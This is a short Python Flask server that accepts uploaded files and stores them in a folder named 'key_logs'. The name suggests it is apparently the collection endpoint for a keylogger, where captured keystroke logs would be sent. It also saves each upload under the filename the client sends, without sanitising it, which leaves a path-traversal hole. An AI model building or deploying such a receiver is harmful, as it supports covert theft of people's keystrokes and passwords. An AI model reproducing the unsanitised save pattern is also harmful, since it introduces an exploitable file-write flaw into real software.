from flask import Flask, request
import os

app = Flask(__name__)
upload_folder = "key_logs"
if not os.path.exists(upload_folder):
    os.makedirs(upload_folder)

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return "No file part", 400
    file = request.files['file']
    if file.filename == '':
        return "No selected file", 400
    file.save(os.path.join(upload_folder, file.filename))
    return "File uploaded successfully", 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
